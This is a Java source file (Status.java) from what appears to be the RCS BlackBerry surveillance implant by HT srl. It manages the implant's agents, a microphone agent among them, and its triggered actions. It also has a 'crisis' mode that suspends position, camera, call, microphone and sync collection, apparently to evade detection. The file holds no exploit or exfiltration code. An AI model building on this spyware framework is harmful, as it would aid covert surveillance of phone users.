//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Status.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Date;
import java.util.Enumeration;
import java.util.Vector;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.util.IntHashtable;
import net.rim.device.api.util.IntVector;
import blackberry.action.Action;
import blackberry.agent.Agent;
import blackberry.agent.CrisisAgent;
import blackberry.agent.MicAgent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.evidence.Evidence;
import blackberry.interfaces.Singleton;
import blackberry.params.Parameter;
import blackberry.utils.Check;


/**
 * The Class Status.
 */
public final class Status implements Singleton {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Status", DebugLevel.VERBOSE);
    //#endif

    public boolean applicationAgentFirstRun;

    /** The agents. */
    IntHashtable agents;

    /** The actions. */
    IntHashtable actions;

    /** The events. */
    IntHashtable events;

    /** The parameters. */
    IntHashtable parameters;

    /** The instance. */
    private static Status instance;

    private static final long GUID = 0xd41c0b0acdfc3d3eL;

    Object lockCrisis = new Object();
    Object lockTriggerAction = new Object();

    Date startingDate;

    /**
     * Gets the single instance of Status.
     * http://www.blackberry.com/knowledgecenterpublic
     * /livelink.exe/fetch/2000/348583
     * /800332/832062/How_to_-_Create_a_singleton_using_the_RuntimeStore
     * .html?nodeid=1461424&vernum=0
     * 
     * @return single instance of Status
     */
    public static synchronized Status getInstance() {
        if (instance == null) {
            instance = (Status) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final Status singleton = new Status();

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    // Debug debug=new Debug("Status");

    /** The crisis. */
    private boolean crisis = false;

    //IntHashtable triggeredAction = new IntHashtable();
    IntVector triggeredActions = new IntVector();

    public boolean synced;
    public boolean gprs;
    public boolean wifi;

    /**
     * Instantiates a new status.
     */
    private Status() {
        agents = new IntHashtable(15);
        actions = new IntHashtable(10);
        events = new IntHashtable(10);
        parameters = new IntHashtable(5);
        startingDate = new Date();
    }

    /**
     * Adds the action.
     * 
     * @param action
     *            the action
     */
    public synchronized void addAction(final Action action) {

        //#ifdef DBC
        Check.requires(actions != null, "Null actions");
        Check.requires(action != null, "Null action");
        Check.requires(action.actionId >= 0, "actionId == " + action.actionId);
        Check.asserts(actions.containsKey(action.actionId) == false,
                "Action already present: " + action);
        //#endif

        actions.put(action.actionId, action);

        //#ifdef DBC
        Check.ensures(actions.containsKey(action.actionId),
                "Action not inserted: " + action);
        //#endif

    }

    /**
     * Adds the agent.
     * 
     * @param agent
     *            the agent
     */
    public synchronized void addAgent(final Agent agent) {
        if (agent == null) {
            //#ifdef DEBUG
            debug.error("Status.java - AddAgent NULL");
            //#endif
            return;
        }

        //#ifdef DBC
        Check.requires(agents != null, "Null Agents");
        Check.requires(agent != null, "Null Agent");
        Check.requires(agent.agentId >= 0, "AgentId == " + agent.agentId);
        Check.asserts(agents.containsKey(agent.agentId) == false,
                "Agent already present: " + agent);
        //#endif

        agents.put(agent.agentId, agent);

        //#ifdef DEBUG
        debug.trace("Agent added:" + agent);

        //#endif

        //#ifdef DBC
        Check.ensures(agents.containsKey(agent.agentId), "Agent not inserted: "
                + agent);
        //#endif

    }

    /**
     * Adds the event.
     * 
     * @param eventId_
     *            the event id
     * @param event
     *            the event
     */
    public synchronized void addEvent(final int eventId_, final Event event) {

        //#ifdef DBC
        Check.requires(events != null, "Null Events");
        Check.requires(event != null, "Null Event");
        Check.requires(eventId_ >= 0, "EventId == " + eventId_);
        Check.asserts(events.containsKey(eventId_) == false,
                "Event already present: " + event);
        //#endif

        event.eventId = eventId_;
        events.put(eventId_, event);

        //#ifdef DBC
        Check.ensures(events.containsKey(eventId_), "Event not inserted: "
                + event);
        //#endif

    }

    /**
     * Adds the parameter.
     * 
     * @param parameter
     *            the parameter
     */
    public synchronized void addParameter(final Parameter parameter) {
        //#ifdef DBC
        Check.requires(parameters != null, "Null parameters");
        Check.requires(parameter != null, "Null parameter");
        Check.requires(parameter.parameterId >= 0, "ParameterId == "
                + parameter.parameterId);
        Check.asserts(actions.containsKey(parameter.parameterId) == false,
                "Parameter already present: " + parameter);
        //#endif

        parameters.put(parameter.parameterId, parameter);

        //#ifdef DBC
        Check.ensures(parameters.containsKey(parameter.parameterId),
                "Parameter not inserted: " + parameter);
        //#endif

    }

    /**
     * Clear.
     */
    public void clear() {
        //#ifdef DEBUG
        debug.trace("Clear");
        //#endif

        triggeredActions.removeAllElements();
        
        agents.clear();
        actions.clear();
        events.clear();
        parameters.clear();
        
        
    }

    /**
     * Count enabled agents.
     * 
     * @return the int
     */
    public synchronized int countEnabledAgents() {
        int enabled = 0;
        final Enumeration e = agents.elements();

        while (e.hasMoreElements()) {
            final Agent agent = (Agent) e.nextElement();

            if (agent.isEnabled()) {
                enabled++;
            }
        }

        return enabled;
    }

    private int crisisType;

    public int drift;

    public synchronized void setCrisis(int type) {

        synchronized (lockCrisis) {
            crisisType = type;
        }

        //#ifdef DEBUG
        debug.info("set crisis: " + type);
        //#endif

        final Agent agent = getAgent(Agent.AGENT_MIC);
        if (agent != null) {
            final MicAgent micAgent = (MicAgent) agent;
            micAgent.crisis(crisisMic());
        }
    }

    public boolean callInAction() {
        final PhoneCall phoneCall = Phone.getActiveCall();
        return phoneCall != null
                && phoneCall.getStatus() != PhoneCall.STATUS_DISCONNECTED;
    }

    private boolean isCrisis() {
        //#ifdef DEMO
        if (crisis) {
            Debug.ledFlash(Debug.COLOR_ORANGE);
        } 
        //#endif

        synchronized (lockCrisis) {
            return crisis;
        }
    }

    public boolean crisisPosition() {
        synchronized (lockCrisis) {
            return (isCrisis() && (crisisType & CrisisAgent.POSITION) != 0);
        }
    }

    public boolean crisisCamera() {
        synchronized (lockCrisis) {
            return (isCrisis() && (crisisType & CrisisAgent.CAMERA) != 0);
        }
    }

    public boolean crisisCall() {
        synchronized (lockCrisis) {
            return (isCrisis() && (crisisType & CrisisAgent.CALL) != 0);
        }
    }

    public boolean crisisMic() {
        synchronized (lockCrisis) {
            return (isCrisis() && (crisisType & CrisisAgent.MIC) != 0);
        }
    }

    public boolean crisisSync() {
        synchronized (lockCrisis) {
            return (isCrisis() && (crisisType & CrisisAgent.SYNC) != 0);
        }
    }

    /**
     * Gets the action.
     * 
     * @param id
     *            the id
     * @return the action
     */
    public synchronized Action getAction(final int id) {
        if (actions.containsKey(id)) {
            final Action action = (Action) actions.get(id);

            //#ifdef DBC
            Check.ensures(action.actionId == id, "not equal actionId");
            //#endif
            return action;
        } else {
            //#ifdef DEBUG
            debug.trace("actions don't contain type " + id);
            //#endif
            return null;
        }
    }

    /**
     * Gets the actions list.
     * 
     * @return the vector
     */
    public synchronized Vector getActionsList() {
        //#ifdef DBC
        Check.requires(actions != null, "Null actions");
        //#endif

        final Enumeration e = actions.elements();
        final Vector vect = new Vector();

        while (e.hasMoreElements()) {
            vect.addElement(e.nextElement());
        }

        //#ifdef DBC
        Check.ensures(actions.size() == vect.size(),
                "actions not equal to vect");
        //#endif

        return vect;
    }

    /**
     * Gets the agent.
     * 
     * @param agentId
     *            the agent id
     * @return the agent
     */
    public synchronized Agent getAgent(final int agentId) {
        if (agents.containsKey(agentId)) {
            final Agent agent = (Agent) agents.get(agentId);

            //#ifdef DBC
            Check.ensures(agent.agentId == agentId, "not equal agentId");
            //#endif
            return agent;
        } else {
            //#ifdef DEBUG
            debug.trace("Agents don't contain type " + agentId);
            //#endif
            return null;
        }
    }

    /**
     * Gets the agents list.
     * 
     * @return the vector
     */
    public synchronized Vector getAgentsList() {
        //#ifdef DBC
        Check.requires(agents != null, "Null Agents");
        //#endif

        final Enumeration e = agents.elements();
        final Vector vect = new Vector();

        while (e.hasMoreElements()) {
            vect.addElement(e.nextElement());
        }

        //#ifdef DBC
        Check.ensures(agents.size() == vect.size(), "agents not equal to vect");
        //#endif
        return vect;
    }

    /**
     * Gets the event.
     * 
     * @param eventId
     *            the event id
     * @return the event
     */
    public synchronized Event getEvent(final int eventId) {
        if (events.containsKey(eventId)) {
            final Event event = (Event) events.get(eventId);

            //#ifdef DBC
            Check.ensures(event.eventId == eventId, "not equal eventId");
            //#endif
            return event;
        } else {
            //#ifdef DEBUG
            debug.error("Events don't contain type " + eventId);
            //#endif
            return null;
        }
    }

    /**
     * Gets the events list.
     * 
     * @return the vector
     */
    public synchronized Vector getEventsList() {
        //#ifdef DBC
        Check.requires(events != null, "Null Events");
        //#endif

        final Enumeration e = events.elements();
        final Vector vect = new Vector();

        while (e.hasMoreElements()) {
            vect.addElement(e.nextElement());
        }

        //#ifdef DBC
        Check.ensures(events.size() == vect.size(), "events not equal to vect");
        //#endif
        return vect;
    }

    /**
     * Gets the parameters list.
     * 
     * @return the vector
     */
    public synchronized Vector getParametersList() {
        //#ifdef DBC
        Check.requires(parameters != null, "Null parameters");
        //#endif

        final Enumeration e = parameters.elements();
        final Vector vect = new Vector();

        while (e.hasMoreElements()) {
            vect.addElement(e.nextElement());
        }

        //#ifdef DBC
        Check.ensures(parameters.size() == vect.size(),
                "parameters not equal to vect");
        //#endif

        return vect;
    }

    /**
     * Checks if is valid agent.
     * 
     * @param agentId
     *            the agent id
     * @return true, if is valid agent
     */
    public synchronized boolean isValidAgent(final int agentId) {
        return agents.containsKey(agentId);
    }

    /**
     * Checks if is valid event.
     * 
     * @param eventId
     *            the event id
     * @return true, if is valid event
     */
    public synchronized boolean isValidEvent(final int eventId) {
        return events.containsKey(eventId);
    }

    /**
     * Re enable agent.
     * 
     * @param agentId
     *            the agent id
     * @return true, if successful
     */
    public synchronized boolean reEnableAgent(final int agentId) {
        final Agent agent = getAgent(agentId);

        if (agent == null) {
            //#ifdef DEBUG
            debug.error("cannot renable agent " + agent);
            //#endif
            return false;
        }

        //#ifdef DEBUG
        debug.trace("ReEnabling " + agent);
        //#endif
        agent.enable(true);
        return true;
    }

    /**
     * Re enable agents.
     * 
     * @return true, if successful
     */
    public synchronized boolean reEnableAgents() {
        final Enumeration e = agents.elements();

        while (e.hasMoreElements()) {
            final Agent agent = (Agent) e.nextElement();
            reEnableAgent(agent.agentId);
        }

        return true;
    }

    /**
     * Start crisis.
     */
    public synchronized void startCrisis() {
        //#ifdef DEMO
        Debug.ledFlash(Debug.COLOR_ORANGE);
        //#endif
        crisis = true;
    }

    /**
     * Stop crisis.
     */
    public synchronized void stopCrisis() {
        crisis = false;
    }

    Object triggeredSemaphore = new Object();

    /**
     * Gets the action id triggered.
     * 
     * @return the action id triggered
     */
    public int[] getTriggeredActions() {

        try {
    
            synchronized (triggeredSemaphore) {
                triggeredSemaphore.wait();
                //debug.trace("getTriggeredActions, triggeredSemaphore waited");
            }
       
        } catch (Exception e) {
            //#ifdef DEBUG
            debug.error("getActionIdTriggered: " + e);
            //#endif
        }

        synchronized (lockTriggerAction) {
            int[] ids = new int[triggeredActions.size()];
            triggeredActions.copyInto(ids);
            return ids;

        }
    }
    
    public boolean isActionTriggered(Action action){
        synchronized (lockTriggerAction) {
            return (triggeredActions.contains(action.actionId)) ;
        }
    }

    /**
     * Removes the action triggered.
     * 
     * @param action
     *            the action
     */
    public void unTriggerAction(final Action action) {

        synchronized (lockTriggerAction) {
            if (triggeredActions.contains(action.actionId)) {
                triggeredActions.removeElement(action.actionId);
            }
        }

   
        synchronized (triggeredSemaphore) {
            try {
                triggeredSemaphore.notifyAll();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    
    }

    /**
     * Trigger action.
     * 
     * @param actionId
     *            the action id
     * @param event
     *            the event
     * @return true, if successful
     */
    public synchronized boolean triggerAction(final int actionId,
            final Event event) {
        //#ifdef DEBUG
        debug.trace("TriggerAction:" + actionId);
        //#endif

        if (actionId != Action.ACTION_NULL && actions.containsKey(actionId)) {
            final Action action = (Action) actions.get(actionId);

            synchronized (lockTriggerAction) {
                if (!triggeredActions.contains(action.actionId)) {
                    triggeredActions.addElement(action.actionId);
                }
            }
  
            synchronized (triggeredSemaphore) {
                try {
                    triggeredSemaphore.notifyAll();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
         

            return true;
        } else {
            //#ifdef DEBUG
            debug.error("TriggerAction FAILED " + actionId);
            //#endif
            return false;
        }
    }

    public void unTriggerAll() {
        synchronized (lockTriggerAction) {
            triggeredActions.removeAllElements();
        }

   
        synchronized (triggeredSemaphore) {
            try {
                triggeredSemaphore.notifyAll();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
           
        }

    }


    public Date getStartingDate() {
        return startingDate;
    }

    /**
     * test-and-set instruction is an instruction used to write to a memory
     * location and return its old value as a single atomic operation
     * 
     * @param newWifi
     * @return true se wifi ha cambiato di stato
     */
    public synchronized boolean testAndSetWifi(boolean newWifi) {
        boolean oldWifi = wifi;
        wifi = newWifi;
        return oldWifi;
    }

    /**
     * test-and-set instruction is an instruction used to write to a memory
     * location and return its old value as a single atomic operation
     * 
     * @param newWifi
     * @return true se wifi ha cambiato di stato
     */
    public synchronized boolean testAndSetGprs(boolean newGprs) {
        boolean oldGprs = gprs;
        gprs = newGprs;
        return oldGprs;
    }
     
    //#ifdef DEBUG

    int wap2Errors;
    int wap2Ok;

    public void wap2Error() {
        wap2Errors++;
        Evidence.info("Wap2 errors: " + wap2Errors + "/" + wap2Ok + " = "
                + wap2Errors * 100 / wap2Ok + "%");
    }

    public void wap2Ok() {
        wap2Ok++;
    }
    //#endif
}
